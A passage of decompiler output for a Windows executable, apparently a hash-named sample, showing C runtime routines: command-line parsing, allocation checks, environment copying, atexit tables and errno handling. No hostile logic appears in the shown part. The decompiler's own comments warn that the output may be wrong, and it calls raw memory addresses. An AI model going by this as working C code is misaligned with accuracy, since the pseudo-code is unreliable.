            *((_DWORD *)v5 + 4) = 142;
            break;
          case 0xC00002B5:
            *((_DWORD *)v5 + 4) = 141;
            break;
        }
        ((void (__fastcall *)(__int64, _QWORD, _QWORD))v9)(8i64, *((unsigned int *)v5 + 4), 0i64);
        *((_DWORD *)v5 + 4) = v14;
      }
      else
      {
        *(_QWORD *)(v8 + 8) = 0i64;
        v9(v11);
      }
      v5[1] = v10;
    }
    return 0xFFFFFFFFi64;
  }
}
// 13F180450: using guessed type __int64 (__fastcall *_guard_check_icall_fptr)(_QWORD);

//----- (000000013F16C430) ----------------------------------------------------
char __fastcall sub_13F16C430(unsigned __int8 *a1, unsigned __int8 **a2, unsigned __int8 *a3, _QWORD *a4, _QWORD *a5)
{
  void **v5; // rax
  unsigned __int8 *v7; // rdi
  unsigned __int8 **v8; // r14
  bool v10; // bp
  unsigned __int8 v11; // si
  bool v12; // si
  int v13; // edx
  unsigned int v14; // eax
  void *retaddr; // [rsp+38h] [rbp+0h] BYREF

  v5 = &retaddr;
  v7 = a3;
  v8 = a2;
  *a5 = 0i64;
  *a4 = 1i64;
  if ( a2 )
  {
    *a2 = a3;
    v8 = a2 + 1;
  }
  v10 = 0;
  do
  {
    if ( *a1 == 34 )
    {
      v11 = 34;
      v10 = !v10;
      ++a1;
    }
    else
    {
      ++*a5;
      if ( v7 )
        *v7++ = *a1;
      v11 = *a1++;
      LODWORD(v5) = sub_13F172580(v11);
      if ( (_DWORD)v5 )
      {
        ++*a5;
        if ( v7 )
        {
          LOBYTE(v5) = *a1;
          *v7++ = *a1;
        }
        ++a1;
      }
      if ( !v11 )
      {
        --a1;
        goto LABEL_19;
      }
    }
  }
  while ( v10 || v11 != 32 && v11 != 9 );
  if ( v7 )
    *(v7 - 1) = 0;
LABEL_19:
  v12 = 0;
  while ( *a1 )
  {
    while ( *a1 == 32 || *a1 == 9 )
      ++a1;
    if ( !*a1 )
      break;
    if ( v8 )
      *v8++ = v7;
    ++*a4;
    while ( 1 )
    {
      v13 = 1;
      v14 = 0;
      while ( *a1 == 92 )
      {
        ++a1;
        ++v14;
      }
      if ( *a1 == 34 )
      {
        if ( (v14 & 1) == 0 )
        {
          if ( v12 && a1[1] == 34 )
          {
            ++a1;
          }
          else
          {
            v13 = 0;
            v12 = !v12;
          }
        }
        v14 >>= 1;
      }
      while ( v14 )
      {
        --v14;
        if ( v7 )
          *v7++ = 92;
        ++*a5;
      }
      LOBYTE(v5) = *a1;
      if ( !*a1 || !v12 && ((_BYTE)v5 == 32 || (_BYTE)v5 == 9) )
        break;
      if ( v13 )
      {
        if ( v7 )
          *v7++ = (unsigned __int8)v5;
        if ( (unsigned int)sub_13F172580(*a1) )
        {
          ++*a5;
          ++a1;
          if ( v7 )
            *v7++ = *a1;
        }
        ++*a5;
      }
      ++a1;
    }
    if ( v7 )
      *v7++ = 0;
    ++*a5;
  }
  if ( v8 )
    *v8 = 0i64;
  ++*a4;
  return (char)v5;
}

//----- (000000013F16C5EC) ----------------------------------------------------
__int64 __fastcall sub_13F16C5EC(unsigned __int64 a1, unsigned __int64 a2, unsigned __int64 a3)
{
  __int64 v4; // rbx

  if ( a1 >= 0x1FFFFFFFFFFFFFFFi64 || a2 >= 0xFFFFFFFFFFFFFFFFui64 / a3 || -1i64 - 8 * a1 <= a3 * a2 )
    return 0i64;
  v4 = sub_13F16E6BC(a3 * a2 + 8 * a1, 1ui64);
  sub_13F16E734(0i64);
  return v4;
}

//----- (000000013F16C650) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F16C650(int a1)
{
  unsigned int v2; // edi
  __int64 v3; // rsi
  unsigned __int64 v4; // r15
  unsigned __int8 **v5; // rax
  __int64 v6; // rbx
  __int64 v7; // rcx
  unsigned int v8; // esi
  __int64 v9; // rdx
  int v10; // ecx
  _QWORD *i; // rax
  _QWORD *v13; // [rsp+68h] [rbp+38h] BYREF
  unsigned __int64 v14; // [rsp+70h] [rbp+40h] BYREF
  unsigned __int64 v15; // [rsp+78h] [rbp+48h] BYREF

  if ( (unsigned int)(a1 - 1) <= 1 )
  {
    sub_13F172178();
    MEMORY[0x76F85940](
      0i64,
      "C:\\Users\\Francesco\\Desktop\\v\\d9f7bb98ad01c4775ec71ec66f5546de131735e6dba8122474cc6eb62320e47b.exe.EXE",
      260i64);
    v3 = 3750432i64;
    v2 = 0;
    off_13F1C6230 = "C:\\Users\\Francesco\\Desktop\\v\\d9f7bb98ad01c4775ec71ec66f5546de131735e6dba8122474cc6eb62320e47b.exe.EXE";
    if ( !MEMORY[0x393A20] )
      v3 = (__int64)"C:\\Users\\Francesco\\Desktop\\v\\d9f7bb98ad01c4775ec71ec66f5546de131735e6dba8122474cc6eb62320e47b.exe.EXE";
    v14 = 0i64;
    v15 = 0i64;
    sub_13F16C430((unsigned __int8 *)v3, 0i64, 0i64, &v14, &v15);
    v4 = v14;
    v5 = (unsigned __int8 **)sub_13F16C5EC(v14, v15, 1ui64);
    v6 = (__int64)v5;
    if ( v5 )
    {
      sub_13F16C430((unsigned __int8 *)v3, v5, (unsigned __int8 *)&v5[v4], &v14, &v15);
      if ( a1 != 1 )
      {
        v13 = 0i64;
        v8 = sub_13F171A74(v6, &v13);
        if ( v8 )
        {
          sub_13F16E734((__int64)v13);
          v13 = 0i64;
          sub_13F16E734(v6);
          return v8;
        }
        v9 = (__int64)v13;
        v10 = 0;
        for ( i = v13; *i; ++v10 )
          ++i;
        dword_13F1C6208 = v10;
        v13 = 0i64;
        qword_13F1C6210 = v9;
        sub_13F16E734(0i64);
        v7 = v6;
        v13 = 0i64;
LABEL_15:
        sub_13F16E734(v7);
        return v2;
      }
      qword_13F1C6210 = v6;
      dword_13F1C6208 = v14 - 1;
    }
    else
    {
      v2 = 12;
      *(_DWORD *)sub_13F169DAC() = 12;
    }
    v7 = 0i64;
    goto LABEL_15;
  }
  v2 = 22;
  *(_DWORD *)sub_13F169DAC() = 22;
  sub_13F1682A0();
  return v2;
}
// 13F16C6AA: write access to const memory at 13F1C6230 has been detected
// 13F16C736: write access to const memory at 13F1C6210 has been detected
// 13F16C73D: write access to const memory at 13F1C6208 has been detected
// 13F16C78F: write access to const memory at 13F1C6208 has been detected
// 13F16C79B: write access to const memory at 13F1C6210 has been detected
// 13F171A74: using guessed type __int64 __fastcall sub_13F171A74(_QWORD, _QWORD);
// 13F1C6208: using guessed type int dword_13F1C6208;
// 13F1C6210: using guessed type __int64 qword_13F1C6210;
// 13F1C6220: using guessed type __int64 qword_13F1C6220;
// 13F1C6230: using guessed type char *off_13F1C6230;

//----- (000000013F16C7C8) ----------------------------------------------------
__int64 sub_13F16C7C8()
{
  return 3990528i64;
}
// 13F1C61A8: using guessed type __int64 qword_13F1C61A8;
// 13F1C61B0: using guessed type __int64 qword_13F1C61B0;

//----- (000000013F16C810) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F16C810()
{
  return 0i64;
}
// 13F16C852: write access to const memory at 13F1C61C0 has been detected
// 13F16C859: write access to const memory at 13F1C61A8 has been detected
// 13F1C61A8: using guessed type __int64 qword_13F1C61A8;

//----- (000000013F16C87C) ----------------------------------------------------
__int64 *__fastcall sub_13F16C87C(_BYTE *a1)
{
  __int64 *v1; // rsi
  _BYTE *v2; // r14
  __int64 v3; // rdx
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 *v6; // rbx
  _QWORD *v7; // r15
  __int64 v8; // rbp
  unsigned __int64 v9; // rbp
  _BYTE *v10; // rax
  _BYTE *v11; // rdi

  v1 = 0i64;
  v2 = a1;
  v3 = 0i64;
  while ( *a1 )
  {
    if ( *a1 != 61 )
      ++v3;
    v4 = -1i64;
    do
      ++v4;
    while ( a1[v4] );
    a1 += v4 + 1;
  }
  v5 = sub_13F16E6BC(v3 + 1, 8ui64);
  v6 = (__int64 *)v5;
  if ( v5 )
  {
    v7 = (_QWORD *)v5;
    while ( *v2 )
    {
      v8 = -1i64;
      do
        ++v8;
      while ( v2[v8] );
      v9 = v8 + 1;
      if ( *v2 != 61 )
      {
        v10 = (_BYTE *)sub_13F16E6BC(v9, 1ui64);
        v11 = v10;
        if ( !v10 )
        {
          sub_13F16C978(v6);
          sub_13F16E734(0i64);
          goto LABEL_20;
        }
        if ( (unsigned int)sub_13F16DD4C(v10, v9, (__int64)v2) )
        {
          sub_13F1682F0();
          JUMPOUT(0x13F16C974i64);
        }
        *v7++ = v11;
        sub_13F16E734(0i64);
      }
      v2 += v9;
    }
    v1 = v6;
  }
LABEL_20:
  sub_13F16E734(0i64);
  return v1;
}
// 13F16C96F: control flows out of bounds to 13F16C974

//----- (000000013F16C978) ----------------------------------------------------
void __fastcall sub_13F16C978(__int64 *a1)
{
  __int64 v1; // rax
  __int64 *v3; // rdi

  if ( a1 )
  {
    v1 = *a1;
    v3 = a1;
    while ( v1 )
    {
      sub_13F16E734(v1);
      v1 = *++v3;
    }
    sub_13F16E734((__int64)a1);
  }
}

//----- (000000013F16C9BC) ----------------------------------------------------
__int64 sub_13F16C9BC()
{
  return 0xFFFFFFFFi64;
}
// 13F1C61B0: using guessed type __int64 qword_13F1C61B0;

//----- (000000013F16CA90) ----------------------------------------------------
void __fastcall sub_13F16CA90(__int64 **a1)
{
  __int64 *v1; // rcx

  v1 = *a1;
  if ( v1 != (__int64 *)3990528 )
    sub_13F16C978(v1);
}

//----- (000000013F16CAAC) ----------------------------------------------------
void __fastcall sub_13F16CAAC(__int64 **a1)
{
  __int64 *v1; // rcx

  v1 = *a1;
  if ( v1 )
    sub_13F16C978(v1);
}

//----- (000000013F16CAD0) ----------------------------------------------------
void sub_13F16CAD0()
{
  sub_13F16CA90((__int64 **)&qword_13F1C61A8);
  sub_13F16CAAC((__int64 **)&qword_13F1C61B0);
  sub_13F16C978((__int64 *)0x3CE400);
  sub_13F16C978(0i64);
}
// 13F1C61A8: using guessed type __int64 qword_13F1C61A8;
// 13F1C61B0: using guessed type __int64 qword_13F1C61B0;

//----- (000000013F16CB08) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F16CB08()
{
  return 3990528i64;
}
// 13F16CB1D: write access to const memory at 13F1C61C0 has been detected

//----- (000000013F16CB34) ----------------------------------------------------
__int64 __fastcall sub_13F16CB34(__int64 a1, __int64 a2, _QWORD **a3)
{
  sub_13F170628();
  LODWORD(a3) = sub_13F16CD10(a3);
  sub_13F17067C();
  return (unsigned int)a3;
}

//----- (000000013F16CB70) ----------------------------------------------------
__int64 __fastcall sub_13F16CB70(__int64 a1, __int64 a2, _QWORD **a3)
{
  _QWORD *v4; // rdx
  unsigned int v5; // ebx
  uintptr_t v6; // rsi
  char v7; // r8
  unsigned __int64 v8; // rdi
  uintptr_t *v9; // rbx
  unsigned __int64 v10; // r12
  uintptr_t *v11; // r14
  uintptr_t v12; // rax
  uintptr_t v13; // rdx
  void (__fastcall *v14)(_QWORD); // rsi
  _QWORD *v15; // rdx
  unsigned __int64 v16; // r9
  uintptr_t *v17; // rax

  sub_13F170628();
  v4 = (_QWORD *)**a3;
  if ( v4 )
  {
    v6 = _security_cookie;
    v7 = _security_cookie & 0x3F;
    v8 = __ROR8__(*v4 ^ _security_cookie, _security_cookie & 0x3F);
    v9 = (uintptr_t *)__ROR8__(v4[1] ^ _security_cookie, _security_cookie & 0x3F);
    if ( v8 - 1 <= 0xFFFFFFFFFFFFFFFDui64 )
    {
      v10 = v8;
      v11 = v9;
LABEL_5:
      v12 = v6 ^ __ROR8__(0i64, 64 - v7);
      while ( (unsigned __int64)--v9 >= v8 )
      {
        if ( *v9 != v12 )
        {
          if ( (unsigned __int64)v9 < v8 )
            break;
          v14 = (void (__fastcall *)(_QWORD))__ROR8__(*v9 ^ v6, v6 & 0x3F);
          *v9 = v12;
          v14(v14);
          v15 = (_QWORD *)**a3;
          v6 = _security_cookie;
          v7 = _security_cookie & 0x3F;
          v16 = __ROR8__(*v15 ^ _security_cookie, _security_cookie & 0x3F);
          v17 = (uintptr_t *)__ROR8__(_security_cookie ^ v15[1], _security_cookie & 0x3F);
          if ( v16 != v10 || v17 != v11 )
          {
            v10 = v16;
            v8 = v16;
            v11 = v17;
            v9 = v17;
          }
          goto LABEL_5;
        }
      }
      if ( v8 != -1i64 )
      {
        sub_13F16E734(v8);
        v6 = _security_cookie;
      }
      v13 = v6 ^ __ROR8__(0i64, 64 - ((unsigned __int8)v6 & 0x3Fu));
      *(_QWORD *)**a3 = v13;
      *(_QWORD *)(**a3 + 8i64) = v13;
      *(_QWORD *)(**a3 + 16i64) = v13;
    }
    v5 = 0;
  }
  else
  {
    v5 = -1;
  }
  sub_13F17067C();
  return v5;
}
// 13F180450: using guessed type __int64 (__fastcall *_guard_check_icall_fptr)(_QWORD);

//----- (000000013F16CD10) ----------------------------------------------------
__int64 __fastcall sub_13F16CD10(_QWORD **a1)
{
  __int64 v1; // rsi
  _QWORD *v3; // rbx
  __int64 result; // rax
  uintptr_t v5; // r8
  __int64 v6; // rbp
  uintptr_t *v7; // r9
  char *v8; // rbx
  unsigned __int64 v9; // rbx
  __int64 v10; // rdi
  unsigned __int64 v11; // rdi
  __int64 v12; // r14
  uintptr_t v13; // rdx
  unsigned __int64 v14; // rax
  uintptr_t *v15; // rcx

  v1 = 0i64;
  v3 = (_QWORD *)**a1;
  if ( !v3 )
    return 0xFFFFFFFFi64;
  v5 = _security_cookie;
  v6 = __ROR8__(_security_cookie ^ *v3, _security_cookie & 0x3F);
  v7 = (uintptr_t *)__ROR8__(_security_cookie ^ v3[1], _security_cookie & 0x3F);
  v8 = (char *)__ROR8__(_security_cookie ^ v3[2], _security_cookie & 0x3F);
  if ( v7 == (uintptr_t *)v8 )
  {
    v9 = (__int64)&v8[-v6] >> 3;
    v10 = v9;
    if ( v9 > 0x200 )
      v10 = 512i64;
    v11 = v9 + v10;
    if ( !v11 )
      v11 = 32i64;
    if ( v11 < v9 || (v12 = sub_13F172A7C(v6, v11, 8i64), sub_13F16E734(0i64), !v12) )
    {
      v11 = v9 + 4;
      v12 = sub_13F172A7C(v6, v9 + 4, 8i64);
      sub_13F16E734(0i64);
      if ( !v12 )
        return 0xFFFFFFFFi64;
    }
    v5 = _security_cookie;
    v7 = (uintptr_t *)(v12 + 8 * v9);
    v8 = (char *)(v12 + 8 * v11);
    v13 = _security_cookie ^ __ROR8__(0i64, 64 - ((unsigned __int8)_security_cookie & 0x3Fu));
    v6 = v12;
    v14 = (unsigned __int64)(v8 - (char *)v7 + 7) >> 3;
    v15 = v7;
    if ( v7 > (uintptr_t *)v8 )
      v14 = 0i64;
    if ( v14 )
    {
      do
      {
        ++v1;
        *v15++ = v13;
      }
      while ( v1 != v14 );
      v5 = _security_cookie;
    }
  }
  *v7 = v5 ^ __ROR8__(*a1[1], 64 - ((unsigned __int8)v5 & 0x3Fu));
  *(_QWORD *)**a1 = _security_cookie ^ __ROR8__(v6, 64 - ((unsigned __int8)_security_cookie & 0x3Fu));
  *(_QWORD *)(**a1 + 8i64) = _security_cookie ^ __ROR8__(v7 + 1, 64 - ((unsigned __int8)_security_cookie & 0x3Fu));
  result = 0i64;
  *(_QWORD *)(**a1 + 16i64) = _security_cookie ^ __ROR8__(v8, 64 - ((unsigned __int8)_security_cookie & 0x3Fu));
  return result;
}
// 13F172A7C: using guessed type __int64 __fastcall sub_13F172A7C(_QWORD, _QWORD, _QWORD);

//----- (000000013F16CEEC) ----------------------------------------------------
__int64 __fastcall sub_13F16CEEC(__int64 a1)
{
  return sub_13F16CF78((__int64)qword_13F1C61C8, a1);
}
// 13F1C61C8: using guessed type __int64 qword_13F1C61C8[3];

//----- (000000013F16CEFC) ----------------------------------------------------
__int64 __fastcall sub_13F16CEFC(__int64 a1)
{
  __int64 *v2; // [rsp+20h] [rbp-18h] BYREF
  __int64 v3; // [rsp+40h] [rbp+8h] BYREF
  __int64 v4; // [rsp+48h] [rbp+10h] BYREF
  int v5; // [rsp+50h] [rbp+18h]
  int v6; // [rsp+58h] [rbp+20h] BYREF

  v3 = a1;
  v2 = &v3;
  v5 = 2;
  v6 = 2;
  return sub_13F16CB70((__int64)&v4, (__int64)&v6, &v2);
}

//----- (000000013F16CF38) ----------------------------------------------------
__int64 __fastcall sub_13F16CF38(uintptr_t *a1)
{
  uintptr_t v2; // r9

  if ( !a1 )
    return 0xFFFFFFFFi64;
  if ( *a1 == a1[2] )
  {
    v2 = _security_cookie ^ __ROR8__(0i64, 64 - ((unsigned __int8)_security_cookie & 0x3Fu));
    *a1 = v2;
    a1[1] = v2;
    a1[2] = v2;
  }
  return 0i64;
}

//----- (000000013F16CF78) ----------------------------------------------------
__int64 __fastcall sub_13F16CF78(__int64 a1, __int64 a2)
{
  int v3; // [rsp+20h] [rbp-20h] BYREF
  _QWORD *v4[3]; // [rsp+28h] [rbp-18h] BYREF
  __int64 v5; // [rsp+50h] [rbp+10h] BYREF
  __int64 v6; // [rsp+58h] [rbp+18h] BYREF
  char v7; // [rsp+60h] [rbp+20h] BYREF
  int v8; // [rsp+68h] [rbp+28h]

  v6 = a2;
  v5 = a1;
  v4[0] = &v5;
  v4[1] = &v6;
  v8 = 2;
  v3 = 2;
  return sub_13F16CB34((__int64)&v7, (__int64)&v3, v4);
}

//----- (000000013F16CFC0) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
char sub_13F16CFC0()
{
  off_13F1C6820 = &off_13F1B74B0;
  return 1;
}
// 13F16CFC7: write access to const memory at 13F1C6820 has been detected
// 13F1B74B0: using guessed type wchar_t *off_13F1B74B0;
// 13F1C6820: using guessed type wchar_t **off_13F1C6820;

//----- (000000013F16CFD4) ----------------------------------------------------
char sub_13F16CFD4()
{
  sub_13F16CF38((uintptr_t *)qword_13F1C61C8);
  sub_13F16CF38((uintptr_t *)qword_13F1C61E0);
  return 1;
}
// 13F1C61C8: using guessed type __int64 qword_13F1C61C8[3];
// 13F1C61E0: using guessed type __int64 qword_13F1C61E0[3];

//----- (000000013F16CFF8) ----------------------------------------------------
char sub_13F16CFF8()
{
  sub_13F16CAD0();
  return 1;
}

//----- (000000013F16D008) ----------------------------------------------------
char sub_13F16D008()
{
  __int64 v0; // rbx

  v0 = _security_cookie ^ __ROR8__(0i64, 64 - ((unsigned __int8)_security_cookie & 0x3Fu));
  sub_13F1681F0(v0);
  sub_13F16C1C8(v0);
  sub_13F172CA0(v0);
  sub_13F16D14C(v0);
  sub_13F16A0D4(v0);
  return 1;
}

//----- (000000013F16D05C) ----------------------------------------------------
char sub_13F16D05C()
{
  return sub_13F15F994(0);
}

//----- (000000013F16D064) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
char sub_13F16D064()
{
  char result; // al

  if ( _InterlockedExchangeAdd((volatile signed __int32 *)0x3C38E0, 0xFFFFFFFF) == 1
    && qword_13F1B7620 != (__int64 *)3946720 )
  {
    sub_13F16E734(3946720i64);
    qword_13F1B7848 = (__int64)qword_13F1B7620;
  }
  sub_13F16E734(0i64);
  qword_13F1C6810 = 0i64;
  sub_13F16E734(0i64);
  qword_13F1C6818 = 0i64;
  sub_13F16E734(3943264i64);
  qword_13F1C6210 = 0i64;
  sub_13F16E734(0i64);
  result = 1;
  qword_13F1C6218 = 0i64;
  return result;
}
// 13F16D095: write access to const memory at 13F1B7848 has been detected
// 13F16D0B1: write access to const memory at 13F1C6810 has been detected
// 13F16D0C4: write access to const memory at 13F1C6818 has been detected
// 13F16D0D7: write access to const memory at 13F1C6210 has been detected
// 13F16D0E5: write access to const memory at 13F1C6218 has been detected
// 13F1B7620: using guessed type __int64 qword_13F1B7620[11];
// 13F1B7848: using guessed type __int64 qword_13F1B7848;
// 13F1C6210: using guessed type __int64 qword_13F1C6210;
// 13F1C6218: using guessed type __int64 qword_13F1C6218;
// 13F1C6810: using guessed type __int64 qword_13F1C6810;
// 13F1C6818: using guessed type __int64 qword_13F1C6818;

//----- (000000013F16D0F4) ----------------------------------------------------
char sub_13F16D0F4()
{
  return sub_13F172B44(off_13F18F060, byte_13F18F150);
}
// 13F18F060: using guessed type __int64 (__fastcall *off_13F18F060[2])();

//----- (000000013F16D108) ----------------------------------------------------
char sub_13F16D108()
{
  return sub_13F172BD8((void (__fastcall **)(_QWORD))off_13F18F060, (void (__fastcall **)(_QWORD))byte_13F18F150);
}
// 13F18F060: using guessed type __int64 (__fastcall *off_13F18F060[2])();

//----- (000000013F16D11C) ----------------------------------------------------
__int64 sub_13F16D11C()
{
  return 1i64;
}

//----- (000000013F16D124) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
void __fastcall sub_13F16D124(int a1)
{
  dword_13F1C61F8 = a1;
}
// 13F16D124: write access to const memory at 13F1C61F8 has been detected
// 13F1C61F8: using guessed type int dword_13F1C61F8;

//----- (000000013F16D12C) ----------------------------------------------------
bool sub_13F16D12C()
{
  return __ROR8__(_security_cookie ^ 0x2CC5EF7154DEi64, _security_cookie & 0x3F) != 0i64;
}

//----- (000000013F16D14C) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
void __fastcall sub_13F16D14C(__int64 a1)
{
  qword_13F1C6200 = a1;
}
// 13F16D14C: write access to const memory at 13F1C6200 has been detected
// 13F1C6200: using guessed type __int64 qword_13F1C6200;

//----- (000000013F16D154) ----------------------------------------------------
__int64 __fastcall sub_13F16D154(__int64 a1)
{
  __int64 (__fastcall *v1)(__int64); // rbx

  v1 = (__int64 (__fastcall *)(__int64))__ROR8__(_security_cookie ^ 0x2CC5EF7154DEi64, _security_cookie & 0x3F);
  if ( v1 )
    return v1(a1);
  else
    return 0i64;
}
// 13F180450: using guessed type __int64 (__fastcall *_guard_check_icall_fptr)(_QWORD);
// 13F1C6200: using guessed type __int64 qword_13F1C6200;

//----- (000000013F16D19C) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
void __fastcall sub_13F16D19C(__int64 a1)
{
  qword_13F1C6200 = _security_cookie ^ __ROR8__(a1, 64 - ((unsigned __int8)_security_cookie & 0x3Fu));
}
// 13F16D1B9: write access to const memory at 13F1C6200 has been detected
// 13F1C6200: using guessed type __int64 qword_13F1C6200;

//----- (000000013F16D1C4) ----------------------------------------------------
void **__fastcall sub_13F16D1C4(_QWORD *a1, unsigned __int64 a2)
{
  void **result; // rax
  _QWORD *v3; // rbx
  __int64 v4; // rbp
  unsigned __int64 v5; // rdi
  void *retaddr; // [rsp+28h] [rbp+0h] BYREF

  result = &retaddr;
  v3 = a1;
  v4 = 0i64;
  v5 = (a2 - (unsigned __int64)a1 + 7) >> 3;
  if ( (unsigned __int64)a1 > a2 )
    v5 = 0i64;
  if ( v5 )
  {
    do
    {
      if ( *v3 )
        result = (void **)((__int64 (__fastcall *)(_QWORD))*v3)(*v3);
      ++v3;
      ++v4;
    }
    while ( v4 != v5 );
  }
  return result;
}
// 13F180450: using guessed type __int64 (__fastcall *_guard_check_icall_fptr)(_QWORD);

//----- (000000013F16D23C) ----------------------------------------------------
__int64 __fastcall sub_13F16D23C(_QWORD *a1, _QWORD *a2)
{
  _QWORD *v3; // rbx
  bool i; // zf
  __int64 result; // rax

  v3 = a1;
  for ( i = a1 == a2; !i; i = v3 == a2 )
  {
    if ( *v3 )
    {
      result = ((__int64 (__fastcall *)(_QWORD))*v3)(*v3);
      if ( (_DWORD)result )
        return result;
    }
    ++v3;
  }
  return 0i64;
}
// 13F180450: using guessed type __int64 (__fastcall *_guard_check_icall_fptr)(_QWORD);

//----- (000000013F16D288) ----------------------------------------------------
__int64 __fastcall sub_13F16D288(__int32 a1)
{
  if ( ((a1 - 0x4000) & 0xFFFF3FFF) != 0 || a1 == 49152 )
  {
    *(_DWORD *)sub_13F169DAC() = 22;
    sub_13F1682A0();
    return 22i64;
  }
  else
  {
    _InterlockedExchange(&dword_13F1C6A98, a1);
    return 0i64;
  }
}
// 13F1C6A98: using guessed type int dword_13F1C6A98;

//----- (000000013F16D2C8) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
char sub_13F16D2C8()
{
  qword_13F1C6220 = MEMORY[0x76F908A0]();
  qword_13F1C6228 = MEMORY[0x76F8B8B0]();
  return 1;
}
// 13F16D2D2: write access to const memory at 13F1C6220 has been detected
// 13F16D2DF: write access to const memory at 13F1C6228 has been detected
// 13F1C6220: using guessed type __int64 qword_13F1C6220;
// 13F1C6228: using guessed type __int64 qword_13F1C6228;

//----- (000000013F16D2F0) ----------------------------------------------------
int *sub_13F16D2F0()
{
  return &dword_13F1C6208;
}
// 13F1C6208: using guessed type int dword_13F1C6208;

//----- (000000013F16D2F8) ----------------------------------------------------
__int64 *sub_13F16D2F8()
{
  return &qword_13F1C6210;
}
// 13F1C6210: using guessed type __int64 qword_13F1C6210;

//----- (000000013F16D300) ----------------------------------------------------
__int64 sub_13F16D300()
{
  return (unsigned int)_InterlockedExchange(&dword_13F1C6238, 1);
}
// 13F1C6238: using guessed type int dword_13F1C6238;

//----- (000000013F16D30C) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
void sub_13F16D30C()
{
  ;
}
// 13F16D33C: write access to const memory at 13F1C6820 has been detected
// 13F1C6820: using guessed type wchar_t **off_13F1C6820;

//----- (000000013F16D354) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F16D354(int a1)
{
  __int64 v2; // rax
  int v3; // er8
  int v4; // ecx
  unsigned int v6; // er8

  v2 = sub_13F16E528();
  v3 = *(_DWORD *)(v2 + 936);
  v4 = -((v3 & 2) != 0);
  if ( a1 == -1 )
  {
    dword_13F1B7B60 = -1;
  }
  else if ( a1 )
  {
    if ( a1 == 1 )
    {
      v6 = v3 | 2;
    }
    else
    {
      if ( a1 != 2 )
      {
        *(_DWORD *)sub_13F169DAC() = 22;
        sub_13F1682A0();
        return 0xFFFFFFFFi64;
      }
      v6 = v3 & 0xFFFFFFFD;
    }
    *(_DWORD *)(v2 + 936) = v6;
  }
  return (unsigned int)(v4 + 2);
}
// 13F16D3AD: write access to const memory at 13F1B7B60 has been detected
// 13F1B7B60: using guessed type int dword_13F1B7B60;

//----- (000000013F16D3C0) ----------------------------------------------------
__int64 sub_13F16D3C0()
{
  return 0i64;
}

//----- (000000013F16D3C8) ----------------------------------------------------
__int64 __fastcall sub_13F16D3C8(unsigned __int32 a1)
{
  if ( a1 <= 1 )
    return (unsigned int)_InterlockedExchange(&dword_13F1C623C, a1);
  *(_DWORD *)sub_13F169DAC() = 22;
  sub_13F1682A0();
  return 0xFFFFFFFFi64;
}
// 13F1C623C: using guessed type int dword_13F1C623C;

//----- (000000013F16D3F4) ----------------------------------------------------
__int64 *sub_13F16D3F4()
{
  return qword_13F1C6240;
}
// 13F1C6240: using guessed type __int64 qword_13F1C6240[2];

//----- (000000013F16D3FC) ----------------------------------------------------
__int64 __fastcall sub_13F16D3FC(_BYTE *a1, unsigned __int64 a2, __int128 *a3)
{
  _BYTE *v5; // rbx
  char *v6; // rax
  unsigned int v7; // ebx
  __int64 v8; // rdx
  int v9; // eax
  unsigned __int64 v10; // r15
  bool v12; // cc
  unsigned __int64 v13; // rax
  unsigned __int64 v14; // rcx
  __int64 v15; // rax
  void *v16; // rsp
  __int64 *v17; // rdi
  __int64 *v18; // rax
  __int64 v19; // [rsp+0h] [rbp-50h] BYREF
  __int64 v20; // [rsp+50h] [rbp+0h] BYREF

  v5 = a1;
  if ( !a1 )
    goto LABEL_2;
  if ( (unsigned __int64)sub_13F16F570(a1, a2) >= a2 )
  {
    *v5 = 0;
LABEL_2:
    v6 = sub_13F169DAC();
    v7 = 22;
LABEL_3:
    *(_DWORD *)v6 = v7;
    sub_13F1682A0();
    return v7;
  }
  v8 = *(_QWORD *)(*(_QWORD *)a3 + 312i64);
  if ( v8 )
  {
    v9 = sub_13F17102C(a3, v8, 0x100u, v5, -1, 0i64, 0, *(_DWORD *)(*(_QWORD *)a3 + 12i64), 1);
    v10 = v9;
    if ( !v9 )
    {
      *(_DWORD *)sub_13F169DAC() = 42;
      return *(unsigned int *)sub_13F169DAC();
    }
    if ( a2 < v9 )
    {
      *v5 = 0;
      v6 = sub_13F169DAC();
      v7 = 34;
      goto LABEL_3;
    }
    if ( (-(__int64)(v9 < (unsigned __int64)(v9 + 16i64)) & (v9 + 16i64)) != 0 )
    {
      v12 = ((v9 + 16i64) & (unsigned __int64)-(__int64)(v9 < (unsigned __int64)(v9 + 16i64))) <= 0x400;
      v13 = v9 + 16i64;
      if ( v12 )
      {
        v14 = v13 & -(__int64)(v10 < v13);
        v15 = v14 + 15;
        if ( v14 + 15 <= v14 )
          v15 = 0xFFFFFFFFFFFFFF0i64;
        v16 = alloca(v15 & 0xFFFFFFFFFFFFFFF0ui64);
        v17 = &v20;
        if ( &v19 == (__int64 *)-80i64 )
          goto LABEL_27;
        LODWORD(v20) = 52428;
      }
      else
      {
        v18 = (__int64 *)sub_13F16F1F8(v13 & -(__int64)(v10 < v13));
        v17 = v18;
        if ( !v18 )
          goto LABEL_26;
        *(_DWORD *)v18 = 56797;
      }
      v17 += 2;
    }
    else
    {
      v17 = 0i64;
    }
LABEL_26:
    if ( v17 )
    {
      if ( (unsigned int)sub_13F17102C(
                           a3,
                           *(_QWORD *)(*(_QWORD *)a3 + 312i64),
                           0x100u,
                           v5,
                           -1,
                           (__int64)v17,
                           v10,
                           *(_DWORD *)(*(_QWORD *)a3 + 12i64),
                           1) )
      {
        v7 = sub_13F16DD4C(v5, a2, (__int64)v17);
      }
      else
      {
        v7 = 42;
        *(_DWORD *)sub_13F169DAC() = 42;
      }
LABEL_31:
      if ( v17 )
      {
        if ( *((_DWORD *)v17 - 4) == 56797 )
          sub_13F16E734((__int64)(v17 - 2));
      }
      return v7;
    }
LABEL_27:
    *(_DWORD *)sub_13F169DAC() = 12;
